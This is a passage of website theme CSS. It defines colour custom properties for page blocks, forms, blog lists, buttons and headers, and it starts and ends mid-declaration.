afeLightAccent-hsl),1);--social-links-block-main-icon-color:hsla(var(--white-hsl),1);--social-links-block-secondary-icon-color:hsla(var(--darkAccent-hsl),1);--solidHeaderBackgroundColor:hsla(var(--white-hsl),1);--solidHeaderBorderColor:hsla(var(--black-hsl),1);--solidHeaderDropShadowColor:hsla(var(--black-hsl),1);--solidHeaderNavigationColor:hsla(var(--black-hsl),1);--summary-block-limited-availability-label-color:hsla(var(--white-hsl),1);--tertiaryButtonBackgroundColor:hsla(var(--safeLightAccent-hsl),1);--tertiaryButtonTextColor:hsla(var(--safeInverseLightAccent-hsl),1);--text-highlight-color:hsla(var(--safeLightAccent-hsl),1);--text-highlight-color-on-background:hsla(var(--safeLightAccent-hsl),1);--tweak-accordion-block-background-color:hsla(var(--white-hsl),1);--tweak-accordion-block-divider-color:hsla(var(--white-hsl),1);--tweak-accordion-block-divider-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-accordion-block-icon-color:hsla(var(--white-hsl),1);--tweak-accordion-block-icon-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-blog-alternating-side-by-side-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-alternating-side-by-side-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-alternating-side-by-side-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-alternating-side-by-side-list-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-basic-grid-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-basic-grid-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-basic-grid-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-basic-grid-list-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-item-author-profile-color:hsla(var(--white-hsl),1);--tweak-blog-item-comment-meta-color:hsla(var(--white-hsl),1);--tweak-blog-item-comment-text-color:hsla(var(--white-hsl),1);--tweak-blog-item-meta-color:hsla(var(--white-hsl),1);--tweak-blog-item-pagination-icon-color:hsla(var(--white-hsl),1);--tweak-blog-item-pagination-meta-color:hsla(var(--white-hsl),1);--tweak-blog-item-pagination-title-color:hsla(var(--white-hsl),1);--tweak-blog-item-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-masonry-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-masonry-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-masonry-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-masonry-list-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-side-by-side-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-side-by-side-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-side-by-side-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-side-by-side-list-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-single-column-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-single-column-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-single-column-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-single-column-list-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-content-link-block-title-color:hsla(var(--white-hsl),1);--tweak-events-item-pagination-date-color:hsla(var(--white-hsl),1);--tweak-events-item-pagination-icon-color:hsla(var(--white-hsl),1);--tweak-events-item-pagination-title-color:hsla(var(--white-hsl),1);--tweak-form-block-background-color:hsla(var(--white-hsl),1);--tweak-form-block-button-background-color:hsla(var(--safeLightAccent-hsl),1);--tweak-form-block-button-background-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-form-block-button-text-color-on-background:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-form-block-caption-color:hsla(var(--white-hsl),1);--tweak-form-block-caption-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-description-color:hsla(var(--white-hsl),1);--tweak-form-block-description-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-option-color:hsla(var(--white-hsl),1);--tweak-form-block-option-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-survey-title-color:hsla(var(--white-hsl),1);--tweak-form-block-survey-title-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-title-color:hsla(var(--white-hsl),1);--tweak-form-block-title-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-field-fill-color:hsla(var(--black-hsl),1);--tweak-form-block-field-fill-color-hsl:var(--black-hsl);--tweak-form-block-field-fill-color-a:1;--tweak-form-block-field-border-color:hsla(var(--white-hsl),1);--tweak-form-block-field-border-color-hsl:var(--white-hsl);--tweak-form-block-field-border-color-a:1;--tweak-form-block-field-input-color:hsla(var(--white-hsl),1);--tweak-form-block-field-input-color-hsl:var(--white-hsl);--tweak-form-block-field-input-color-a:1;--tweak-form-block-field-accessory-color:hsla(var(--white-hsl),1);--tweak-form-block-field-fill-color-on-background:hsla(var(--lightAccent-hsl),1);--tweak-form-block-field-fill-color-on-background-hsl:var(--lightAccent-hsl);--tweak-form-block-field-fill-color-on-background-a:1;--tweak-form-block-field-border-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-border-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-border-color-on-background-a:1;--tweak-form-block-field-input-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-input-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-input-color-on-background-a:1;--tweak-form-block-field-accessory-color-on-background:hsla(var(--black-hsl),1);--tweak-gallery-icon-background-color:hsla(var(--darkAccent-hsl),1);--tweak-gallery-icon-color:hsla(var(--white-hsl),1);--tweak-gallery-lightbox-background-color:hsla(var(--darkAccent-hsl),1);--tweak-gallery-lightbox-icon-color:hsla(var(--white-hsl),1);--tweak-heading-extra-large-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-heading-large-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-heading-medium-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-heading-small-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-line-block-line-color:hsla(var(--safeLightAccent-hsl),1);--tweak-marquee-block-background-color:hsla(var(--white-hsl),1);--tweak-marquee-block-heading-color:hsla(var(--white-hsl),1);--tweak-marquee-block-heading-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-marquee-block-paragraph-color:hsla(var(--white-hsl),1);--tweak-marquee-block-paragraph-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-menu-block-item-description-color:hsla(var(--white-hsl),1);--tweak-menu-block-item-price-color:hsla(var(--white-hsl),1);--tweak-menu-block-item-title-color:hsla(var(--white-hsl),1);--tweak-menu-block-nav-color:hsla(var(--safeLightAccent-hsl),1);--tweak-menu-block-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-newsletter-block-background-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-button-background-color:hsla(var(--safeLightAccent-hsl),1);--tweak-newsletter-block-button-background-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-newsletter-block-button-text-color-on-background:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-newsletter-block-description-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-description-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-footnote-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-footnote-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-newsletter-block-title-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-title-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-paragraph-large-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-paragraph-link-color-on-background:hsla(var(--safeLightAccent-hsl),1);--tweak-paragraph-medium-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-paragraph-small-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-portfolio-item-pagination-icon-color:hsla(var(--white-hsl),1);--tweak-portfolio-item-pagination-meta-color:hsla(var(--white-hsl),1);--tweak-portfolio-item-pagination-title-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-breadcumb-nav-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-description-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-gallery-controls-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-product-basic-item-price-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-scarcity-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-product-basic-item-variant-fields-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-category-nav-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-pagination-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-price-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-scarcity-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-status-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-title-color:hsla(var(--safeLightAccent-hsl),1);--tweak-product-quick-view-button-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-controls-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-overlay-color:hsla(var(--white-hsl),1);--tweak-quote-block-background-color:hsla(var(--white-hsl),1);--tweak-quote-block-source-color:hsla(var(--white-hsl),1);--tweak-quote-block-source-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-quote-block-text-color:hsla(var(--white-hsl),1);--tweak-quote-block-text-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-background-color:hsla(var(--white-hsl),1);--tweak-summary-block-excerpt-color:hsla(var(--white-hsl),1);--tweak-summary-block-excerpt-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-header-text-color:hsla(var(--white-hsl),1);--tweak-summary-block-header-text-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-primary-metadata-color:hsla(var(--white-hsl),1);--tweak-summary-block-primary-metadata-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-read-more-color:hsla(var(--white-hsl),1);--tweak-summary-block-read-more-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-secondary-metadata-color:hsla(var(--white-hsl),1);--tweak-summary-block-secondary-metadata-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-summary-block-title-color:hsla(var(--white-hsl),1);--tweak-summary-block-title-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-text-block-background-color:hsla(var(--white-hsl),1);--tweak-video-item-description-color:hsla(var(--accent-hsl),1);--tweak-video-item-meta-color:hsla(var(--accent-hsl),1);--tweak-video-item-pagination-icon-color:hsla(var(--accent-hsl),1);--tweak-video-item-pagination-title-color:hsla(var(--accent-hsl),1);--tweak-video-item-title-color:hsla(var(--accent-hsl),1);--video-grid-basic-description-color:hsla(var(--accent-hsl),1);--video-grid-basic-meta-color:hsla(var(--accent-hsl),1);--video-grid-basic-title-color:hsla(var(--accent-hsl),1);--video-grid-category-nav-color:hsla(var(--accent-hsl),1);}.black {--announcement-bar-background-color:hsla(var(--white-hsl),1);--announcement-bar-text-color:hsla(var(--black-hsl),1);--backgroundOverlayColor:hsla(var(--black-hsl),1);--course-item-nav-active-lesson-background-color:hsla(var(--lightAccent-hsl),1);--course-item-nav-active-lesson-text-color:hsla(var(--black-hsl),1);--course-item-nav-background-color:hsla(var(--darkAccent-hsl),1);--course-item-nav-border-color:hsla(var(--white-hsl),0.25);--course-item-nav-text-color:hsla(var(--white-hsl),1);--course-list-course-progress-bar-color:hsla(var(--accent-hsl),1);--course-list-course-item-background:hsla(var(--white-hsl),1);--course-list-course-item-hover-background:hsla(var(--white-hsl),0.95);--course-list-course-item-text-color:hsla(var(--black-hsl),1);--course-list-course-chapter-divider-color:hsla(var(--accent-hsl),1);--course-list-grid-layout-chapter-divider-color:hsla(var(--white-hsl),1);--course-list-grid-layout-course-item-background-color:hsla(var(--white-hsl),1);--course-list-grid-layout-course-item-hover-background-color:hsla(var(--white-hsl),0.95);--course-list-grid-layout-course-item-text-color:hsla(var(--black-hsl),1);--course-list-grid-layout-course-item-border-color:hsla(var(--accent-hsl),1);--gradientHeaderBackgroundColor:hsla(var(--white-hsl),1);--gradientHeaderBorderColor:hsla(var(--black-hsl),1);--gradientHeaderDropShadowColor:hsla(var(--black-hsl),1);--gradientHeaderNavigationColor:hsla(var(--black-hsl),1);--headerDropShadowColor:hsla(var(--black-hsl),1);--headerBorderColor:hsla(var(--black-hsl),1);--headingExtraLargeColor:hsla(var(--white-hsl),1);--headingLargeColor:hsla(var(--white-hsl),1);--headingLinkColor:hsla(var(--lightAccent-hsl),1);--headingMediumColor:hsla(var(--white-hsl),1);--headingSmallColor:hsla(var(--white-hsl),1);--image-block-card-image-button-bg-color:hsla(var(--safeLightAccent-hsl),1);--image-block-card-image-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--image-block-card-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-card-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-card-image-title-bg-color:hsla(var(--black-hsl),0);--image-block-card-image-title-color:hsla(var(--white-hsl),1);--image-block-card-inline-link-color:hsla(var(--white-hsl),1);--image-block-collage-background-color:hsla(var(--white-hsl),1);--image-block-collage-image-button-bg-color:hsla(var(--safeDarkAccent-hsl),1);--image-block-collage-image-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--image-block-collage-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-collage-image-subtitle-color:hsla(var(--black-hsl),1);--image-block-collage-image-title-bg-color:hsla(var(--black-hsl),0);--image-block-collage-image-title-color:hsla(var(--black-hsl),1);--image-block-collage-inline-link-color:hsla(var(--black-hsl),1);--image-block-overlap-image-button-bg-color:hsla(var(--safeLightAccent-hsl),1);--image-block-overlap-image-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--image-block-overlap-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-overlap-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-overlap-image-title-bg-color:hsla(var(--black-hsl),1);--image-block-overlap-image-title-color:hsla(var(--white-hsl),1);--image-block-overlap-inline-link-color:hsla(var(--white-hsl),1);--image-block-overlay-color:hsla(var(--black-hsl),0.5);--image-block-poster-image-button-bg-color:hsla(var(--safeLightAccent-hsl),1);--image-block-poster-image-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--image-block-poster-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-poster-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-poster-image-title-bg-color-v2:hsla(var(--black-hsl),0);--image-block-poster-image-title-color:hsla(var(--white-hsl),1);--image-block-poster-inline-link-color:hsla(var(--white-hsl),1);--image-block-stack-image-button-bg-color:hsla(var(--safeLightAccent-hsl),1);--image-block-stack-image-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--image-block-stack-image-overlay-color:hsla(var(--darkAccent-hsl),1);--image-block-stack-image-subtitle-color:hsla(var(--white-hsl),1);--image-block-stack-image-title-bg-color:hsla(var(--black-hsl),0);--image-block-stack-image-title-color:hsla(var(--white-hsl),1);--image-block-stack-inline-link-color:hsla(var(--white-hsl),1);--list-section-banner-slideshow-arrow-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-banner-slideshow-arrow-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-banner-slideshow-button-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-banner-slideshow-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-banner-slideshow-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-banner-slideshow-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-banner-slideshow-card-color:hsla(var(--white-hsl),1);--list-section-banner-slideshow-card-description-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-card-description-link-color:hsla(var(--safeLightAccent-hsl),1);--list-section-banner-slideshow-card-title-color:hsla(var(--black-hsl),1);--list-section-banner-slideshow-description-color:hsla(var(--white-hsl),1);--list-section-banner-slideshow-title-color:hsla(var(--white-hsl),1);--list-section-carousel-arrow-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-carousel-arrow-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-carousel-button-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-carousel-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-carousel-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-carousel-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-carousel-card-color:hsla(var(--white-hsl),1);--list-section-carousel-card-description-color:hsla(var(--black-hsl),1);--list-section-carousel-card-description-link-color:hsla(var(--safeLightAccent-hsl),1);--list-section-carousel-card-title-color:hsla(var(--black-hsl),1);--list-section-carousel-description-color:hsla(var(--white-hsl),1);--list-section-carousel-title-color:hsla(var(--white-hsl),1);--list-section-simple-button-background-color:hsla(var(--safeLightAccent-hsl),1);--list-section-simple-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--list-section-simple-card-button-background-color:hsla(var(--safeDarkAccent-hsl),1);--list-section-simple-card-button-text-color:hsla(var(--safeInverseDarkAccent-hsl),1);--list-section-simple-card-color:hsla(var(--white-hsl),1);--list-section-simple-card-description-color:hsla(var(--black-hsl),1);--list-section-simple-card-description-link-color:hsla(var(--safeLightAccent-hsl),1);--list-section-simple-card-title-color:hsla(var(--black-hsl),1);--list-section-simple-description-color:hsla(var(--white-hsl),1);--list-section-simple-title-color:hsla(var(--white-hsl),1);--list-section-title-color:hsla(var(--white-hsl),1);--menuOverlayBackgroundColor:hsla(var(--black-hsl),1);--menuOverlayButtonBackgroundColor:hsla(var(--safeLightAccent-hsl),1);--menuOverlayButtonTextColor:hsla(var(--safeInverseLightAccent-hsl),1);--menuOverlayNavigationLinkColor:hsla(var(--white-hsl),1);--navigationLinkColor:hsla(var(--white-hsl),1);--paragraphLargeColor:hsla(var(--white-hsl),1);--paragraphLinkColor:hsla(var(--safeLightAccent-hsl),1);--paragraphMediumColor:hsla(var(--white-hsl),1);--paragraphSmallColor:hsla(var(--white-hsl),1);--portfolio-grid-basic-title-color:hsla(var(--white-hsl),1);--portfolio-grid-overlay-overlay-color:hsla(var(--black-hsl),1);--portfolio-grid-overlay-title-color:hsla(var(--white-hsl),1);--portfolio-hover-follow-title-color:hsla(var(--white-hsl),1);--portfolio-hover-static-title-color:hsla(var(--white-hsl),1);--portfolio-index-background-title-color:hsla(var(--white-hsl),1);--primaryButtonBackgroundColor:hsla(var(--safeLightAccent-hsl),1);--primaryButtonTextColor:hsla(var(--safeInverseLightAccent-hsl),1);--secondaryButtonBackgroundColor:hsla(var(--safeLightAccent-hsl),1);--secondaryButtonTextColor:hsla(var(--safeInverseLightAccent-hsl),1);--section-divider-stroke-color:hsla(var(--safeLightAccent-hsl),1);--section-inset-border-color:hsla(var(--black-hsl),1);--shape-block-background-color:hsla(var(--white-hsl),1);--shape-block-dropshadow-color:hsla(var(--white-hsl),1);--shape-block-stroke-color:hsla(var(--safeDarkAccent-hsl),1);--siteBackgroundColor:hsla(var(--black-hsl),1);--siteTitleColor:hsla(var(--white-hsl),1);--social-links-block-main-icon-color:hsla(var(--white-hsl),1);--social-links-block-secondary-icon-color:hsla(var(--black-hsl),1);--solidHeaderBackgroundColor:hsla(var(--white-hsl),1);--solidHeaderBorderColor:hsla(var(--black-hsl),1);--solidHeaderDropShadowColor:hsla(var(--black-hsl),1);--solidHeaderNavigationColor:hsla(var(--black-hsl),1);--summary-block-limited-availability-label-color:hsla(var(--white-hsl),1);--tertiaryButtonBackgroundColor:hsla(var(--safeLightAccent-hsl),1);--tertiaryButtonTextColor:hsla(var(--safeInverseLightAccent-hsl),1);--text-highlight-color:hsla(var(--safeLightAccent-hsl),1);--text-highlight-color-on-background:hsla(var(--safeLightAccent-hsl),1);--tweak-accordion-block-background-color:hsla(var(--white-hsl),1);--tweak-accordion-block-divider-color:hsla(var(--white-hsl),1);--tweak-accordion-block-divider-color-on-background:hsla(var(--black-hsl),1);--tweak-accordion-block-icon-color:hsla(var(--white-hsl),1);--tweak-accordion-block-icon-color-on-background:hsla(var(--black-hsl),1);--tweak-blog-alternating-side-by-side-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-alternating-side-by-side-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-alternating-side-by-side-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-alternating-side-by-side-list-title-color:hsla(var(--white-hsl),1);--tweak-blog-basic-grid-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-basic-grid-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-basic-grid-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-basic-grid-list-title-color:hsla(var(--white-hsl),1);--tweak-blog-item-author-profile-color:hsla(var(--white-hsl),1);--tweak-blog-item-comment-meta-color:hsla(var(--white-hsl),1);--tweak-blog-item-comment-text-color:hsla(var(--white-hsl),1);--tweak-blog-item-meta-color:hsla(var(--white-hsl),1);--tweak-blog-item-pagination-icon-color:hsla(var(--white-hsl),1);--tweak-blog-item-pagination-meta-color:hsla(var(--white-hsl),1);--tweak-blog-item-pagination-title-color:hsla(var(--white-hsl),1);--tweak-blog-item-title-color:hsla(var(--white-hsl),1);--tweak-blog-masonry-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-masonry-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-masonry-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-masonry-list-title-color:hsla(var(--white-hsl),1);--tweak-blog-side-by-side-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-side-by-side-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-side-by-side-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-side-by-side-list-title-color:hsla(var(--white-hsl),1);--tweak-blog-single-column-list-excerpt-color:hsla(var(--white-hsl),1);--tweak-blog-single-column-list-meta-color:hsla(var(--white-hsl),1);--tweak-blog-single-column-list-read-more-color:hsla(var(--safeLightAccent-hsl),1);--tweak-blog-single-column-list-title-color:hsla(var(--white-hsl),1);--tweak-content-link-block-title-color:hsla(var(--white-hsl),1);--tweak-events-item-pagination-date-color:hsla(var(--white-hsl),1);--tweak-events-item-pagination-icon-color:hsla(var(--white-hsl),1);--tweak-events-item-pagination-title-color:hsla(var(--white-hsl),1);--tweak-form-block-background-color:hsla(var(--white-hsl),1);--tweak-form-block-button-background-color:hsla(var(--safeLightAccent-hsl),1);--tweak-form-block-button-background-color-on-background:hsla(var(--safeDarkAccent-hsl),1);--tweak-form-block-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-form-block-button-text-color-on-background:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-form-block-caption-color:hsla(var(--white-hsl),1);--tweak-form-block-caption-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-description-color:hsla(var(--white-hsl),1);--tweak-form-block-description-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-option-color:hsla(var(--white-hsl),1);--tweak-form-block-option-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-survey-title-color:hsla(var(--white-hsl),1);--tweak-form-block-survey-title-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-title-color:hsla(var(--white-hsl),1);--tweak-form-block-title-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-fill-color:hsla(var(--darkAccent-hsl),1);--tweak-form-block-field-fill-color-hsl:var(--darkAccent-hsl);--tweak-form-block-field-fill-color-a:1;--tweak-form-block-field-border-color:hsla(var(--white-hsl),1);--tweak-form-block-field-border-color-hsl:var(--white-hsl);--tweak-form-block-field-border-color-a:1;--tweak-form-block-field-input-color:hsla(var(--white-hsl),1);--tweak-form-block-field-input-color-hsl:var(--white-hsl);--tweak-form-block-field-input-color-a:1;--tweak-form-block-field-accessory-color:hsla(var(--white-hsl),1);--tweak-form-block-field-fill-color-on-background:hsla(var(--lightAccent-hsl),1);--tweak-form-block-field-fill-color-on-background-hsl:var(--lightAccent-hsl);--tweak-form-block-field-fill-color-on-background-a:1;--tweak-form-block-field-border-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-border-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-border-color-on-background-a:1;--tweak-form-block-field-input-color-on-background:hsla(var(--black-hsl),1);--tweak-form-block-field-input-color-on-background-hsl:var(--black-hsl);--tweak-form-block-field-input-color-on-background-a:1;--tweak-form-block-field-accessory-color-on-background:hsla(var(--black-hsl),1);--tweak-gallery-icon-background-color:hsla(var(--black-hsl),1);--tweak-gallery-icon-color:hsla(var(--white-hsl),1);--tweak-gallery-lightbox-background-color:hsla(var(--black-hsl),1);--tweak-gallery-lightbox-icon-color:hsla(var(--white-hsl),1);--tweak-heading-extra-large-color-on-background:hsla(var(--black-hsl),1);--tweak-heading-large-color-on-background:hsla(var(--black-hsl),1);--tweak-heading-medium-color-on-background:hsla(var(--black-hsl),1);--tweak-heading-small-color-on-background:hsla(var(--black-hsl),1);--tweak-line-block-line-color:hsla(var(--white-hsl),1);--tweak-marquee-block-background-color:hsla(var(--white-hsl),1);--tweak-marquee-block-heading-color:hsla(var(--white-hsl),1);--tweak-marquee-block-heading-color-on-background:hsla(var(--black-hsl),1);--tweak-marquee-block-paragraph-color:hsla(var(--white-hsl),1);--tweak-marquee-block-paragraph-color-on-background:hsla(var(--black-hsl),1);--tweak-menu-block-item-description-color:hsla(var(--white-hsl),1);--tweak-menu-block-item-price-color:hsla(var(--white-hsl),1);--tweak-menu-block-item-title-color:hsla(var(--white-hsl),1);--tweak-menu-block-nav-color:hsla(var(--white-hsl),1);--tweak-menu-block-title-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-background-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-button-background-color:hsla(var(--safeLightAccent-hsl),1);--tweak-newsletter-block-button-background-color-on-background:hsla(var(--black-hsl),1);--tweak-newsletter-block-button-text-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-newsletter-block-button-text-color-on-background:hsla(var(--safeInverseDarkAccent-hsl),1);--tweak-newsletter-block-description-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-description-color-on-background:hsla(var(--black-hsl),1);--tweak-newsletter-block-footnote-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-footnote-color-on-background:hsla(var(--black-hsl),1);--tweak-newsletter-block-title-color:hsla(var(--white-hsl),1);--tweak-newsletter-block-title-color-on-background:hsla(var(--black-hsl),1);--tweak-paragraph-large-color-on-background:hsla(var(--black-hsl),1);--tweak-paragraph-link-color-on-background:hsla(var(--safeLightAccent-hsl),1);--tweak-paragraph-medium-color-on-background:hsla(var(--black-hsl),1);--tweak-paragraph-small-color-on-background:hsla(var(--black-hsl),1);--tweak-portfolio-item-pagination-icon-color:hsla(var(--white-hsl),1);--tweak-portfolio-item-pagination-meta-color:hsla(var(--white-hsl),1);--tweak-portfolio-item-pagination-title-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-breadcumb-nav-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-description-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-gallery-controls-color:hsla(var(--safeInverseLightAccent-hsl),1);--tweak-product-basic-item-price-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-scarcity-color:hsla(var(--accent-hsl),1);--tweak-product-basic-item-title-color:hsla(var(--white-hsl),1);--tweak-product-basic-item-variant-fields-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-category-nav-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-pagination-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-price-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-sale-price-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-scarcity-color:hsla(var(--white-hsl),1);--tweak-product-grid-text-below-list-status-color:hsla(var(--accent-hsl),1);--tweak-product-grid-text-below-list-title-color:hsla(var(--white-hsl),1);--tweak-product-quick-view-button-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-controls-color:hsla(var(--black-hsl),1);--tweak-product-quick-view-lightbox-overlay-color:hsla(var(--white-hsl),1);--tweak-quote-block-background-color:hsla(var(--white-hsl),1);--tweak-quote-block-source-color:hsla(var(--white-hsl),1);--tweak-quote-block-source-color-on-background:hsla(var(--black-hsl),1);--tweak-quote-block-text-color:hsla(var(--white-hsl),1);--tweak-quote-block-text-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-background-color:hsla(var(--white-hsl),1);--tweak-summary-block-excerpt-color:hsla(var(--white-hsl),1);--tweak-summary-block-excerpt-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-header-text-color:hsla(var(--white-hsl),1);--tweak-summary-block-header-text-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-primary-metadata-color:hsla(var(--white-hsl),1);--tweak-summary-block-primary-metadata-color-on-background:hsla(var(--black-hsl),1);--tweak-summary-block-read-more-color:hsla(var(--white-hsl),1);--tweak-summary-block-read-more-color-